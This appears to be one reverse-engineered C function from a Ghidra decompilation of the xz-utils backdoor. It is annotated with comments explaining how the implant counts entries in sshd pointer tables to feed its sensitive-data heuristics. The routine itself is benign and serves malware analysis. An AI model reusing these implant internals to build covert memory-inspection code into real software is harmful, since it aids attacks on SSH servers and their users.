// /home/kali/xzre-ghidra/xzregh/1074B0_count_pointers.c
// Function: count_pointers @ 0x1074B0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall count_pointers(void * * ptrs, u64 * count_out, libc_imports_t * funcs)


/*
 * AutoDoc: Counts consecutive non-NULL entries inside an sshd pointer table. It first confirms the caller handed in both the array and a
 * `malloc_usable_size()` hook, queries the allocator for the actual buffer size, and only trusts tables smaller than ~0x80 bytes to
 * avoid chasing attacker-sized allocations. The loop stops at the first NULL or the allocation boundary, then reports how many slots
 * were populated so the sensitive-data heuristics can reason about argv/envp-style arrays.
 */

#include "xzre_types.h"

BOOL count_pointers(void **ptrs,u64 *count_out,libc_imports_t *funcs)

{
  BOOL success;
  size_t allocation_size;
  ulong probe_index;
  ulong live_count;
  
  // AutoDoc: Refuse to run without both the pointer list and libc’s `malloc_usable_size()`; this helper never guesses lengths.
  if (((ptrs == (void **)0x0) || (funcs == (libc_imports_t *)0x0)) ||
     (funcs->malloc_usable_size == (pfn_malloc_usable_size_t)0x0)) {
    return FALSE;
  }
  // AutoDoc: Measure the actual chunk so the scan can stop exactly at the allocator boundary.
  allocation_size = (*funcs->malloc_usable_size)(ptrs);
  // AutoDoc: Only trust reasonably small pointer tables (<=0x87 bytes) to avoid spending time on obviously bogus chunks.
  if (allocation_size - 8 < 0x80) {
    probe_index = 0;
    do {
      live_count = probe_index;
      // AutoDoc: Stop counting as soon as we see a NULL terminator; argv/envp arrays always use that sentinel.
      if (ptrs[probe_index] == (void *)0x0) break;
      probe_index = (ulong)((int)probe_index + 1);
      // AutoDoc: If we hit the allocation boundary without seeing NULL, treat the whole buffer as populated.
      live_count = allocation_size >> 3;
    } while (probe_index < allocation_size >> 3);
    *count_out = live_count;
    success = TRUE;
  }
  else {
    success = FALSE;
  }
  return success;
}

